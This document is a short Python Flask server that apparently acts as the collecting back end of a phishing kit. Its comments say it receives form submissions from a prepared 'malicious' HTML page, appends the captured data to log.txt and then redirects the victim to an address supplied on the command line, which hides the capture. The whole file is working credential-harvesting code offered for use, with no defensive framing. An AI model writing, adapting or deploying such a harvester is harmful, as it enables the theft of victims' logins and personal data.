from flask import Flask, render_template, request, redirect
import sys

app = Flask(__name__)
redirectUrl = sys.argv[1]

# Note: the index route name can be changed to whatever
@app.route("/")
def index():
  return render_template("output.html")

# This route gets the request data from the malicious made ahead html file
# logs the data to `log.txt`
# and redirects to a given cli arg url.
@app.route("/log", methods=["POST", "GET"])
def log():
  global redirectUrl
  data = request.form
  print(data)

  with open("log.txt", "a+") as f:
    f.write(str(data)+"\n")
    f.close()
  return redirect(redirectUrl)


if __name__ == "__main__":
  app.run(debug=True)
